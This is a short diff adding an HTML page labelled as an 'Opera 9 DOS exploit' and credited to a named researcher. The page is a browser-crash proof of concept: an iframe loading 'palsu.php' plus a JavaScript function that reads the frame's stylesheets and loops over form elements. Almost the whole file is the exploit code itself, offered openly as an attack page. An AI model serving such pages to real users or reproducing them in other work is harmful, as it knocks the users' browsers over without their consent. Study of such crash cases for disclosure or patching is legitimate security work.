@@ -1,0 +1,22 @@
+&lt;!-- Opera 9 DOS exploit, discovered by 
+     Ahmad Muammar W.K (y3dips[at]echo[dot]or[dot]id) 
+     http://y3d1ps.blogspot.com
+//--&gt;
+
+&lt;html&gt;
+&lt;iframe src=&quot;palsu.php&quot; name=&quot;fake&quot;  &gt;&lt;/iframe&gt; 
+&lt;script type=&quot;text/javascript&quot;&gt;
+function mystyle() {
+    if (fake.document.styleSheets.length == 1 ) 
+	{
+      f = document.forms[&quot;basicstyle&quot;].elements;
+      for (j = 0; j &lt; f.length; j++) 
+	  	{
+       	if (f[j].name == &#039;fsmain&#039;);
+      	}  
+      }
+
+ }
+mystyle();
+&lt;/script&gt;
+&lt;/html&gt;
